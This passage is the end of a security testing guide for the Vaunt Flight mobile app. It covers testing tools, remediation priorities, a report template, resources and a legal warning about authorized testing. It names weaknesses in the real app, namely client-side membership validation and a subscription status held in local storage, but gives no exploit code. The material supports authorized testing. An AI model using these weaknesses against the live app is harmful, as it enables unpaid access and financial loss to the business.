- Burp Suite Community Edition
- Frida dynamic instrumentation toolkit
- Standard Windows tools (Notepad++, 7-Zip)

Testing approach:
1. Local file system analysis
2. Database manipulation
3. Network traffic interception
4. Static code analysis
5. Runtime instrumentation
6. Deep link testing

---

## Remediation Priority

### IMMEDIATE (Within 1 week):
1. Move all membership validation to server-side
2. Rotate Google Maps API key and add restrictions
3. Stop storing subscription status in local storage

### SHORT TERM (Within 1 month):
1. Implement SSL certificate pinning
2. Implement encrypted storage
3. Add root/jailbreak detection
4. Enable code obfuscation

### LONG TERM (Within 3 months):
1. Regular security audits
2. Bug bounty program
3. Runtime integrity monitoring
4. Security awareness training for developers

---

## Conclusion

The Vaunt Flight App exhibits **CRITICAL** security vulnerabilities that expose the business to significant financial risk. The primary issue is over-reliance on client-side validation and unencrypted storage of sensitive data.

**Immediate action is required** to implement server-side validation and encrypted storage before these vulnerabilities are exploited by malicious actors.

**Total Vulnerabilities Found:** 8
**Critical:** 3
**High:** 2
**Medium:** 3
**Low:** 0

---

**Report Prepared By:** [Your Name]
**Date:** [Date]
**Contact:** [Email]

**Confidentiality:** This report contains sensitive security information and should be treated as confidential.

```

---

## 🎓 Additional Resources

### Learning Resources:
- OWASP Mobile Security Testing Guide: https://mobile-security.gitbook.io/
- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- React Native Security Best Practices: https://reactnative.dev/docs/security

### Tools Documentation:
- LDPlayer: https://www.ldplayer.net/help.html
- DB Browser for SQLite: https://sqlitebrowser.org/
- Burp Suite: https://portswigger.net/burp/documentation
- Frida: https://frida.re/docs/

---

## ⚖️ Legal & Ethical Reminder

**⚠️ CRITICAL WARNING ⚠️**

This testing guide is for **AUTHORIZED SECURITY TESTING ONLY**.

**YOU MUST HAVE:**
- ✅ Written authorization from Vaunt or app owner
- ✅ Controlled test environment
- ✅ Test accounts only (not real users)
- ✅ Legal permission to perform security testing

**DO NOT:**
- ❌ Test on production systems without authorization
- ❌ Use real user accounts
- ❌ Complete actual financial transactions
- ❌ Share vulnerabilities publicly before responsible disclosure
- ❌ Use exploits for personal gain

**VIOLATIONS MAY RESULT IN:**
- Criminal prosecution under CFAA
- Civil lawsuits
- DMCA violations
- Terms of Service violations

**RESPONSIBLE DISCLOSURE:**
1. Report findings to Vaunt security team
2. Allow 90 days for remediation
3. Do not exploit on production systems

---

**Document Version:** 1.0
**Last Updated:** November 4, 2025
**Status:** COMPLETE - Ready for Testing

**This is a comprehensive security testing suite. All tests are designed to be performed using LDPlayer's local file access method without requiring ADB commands.**

---
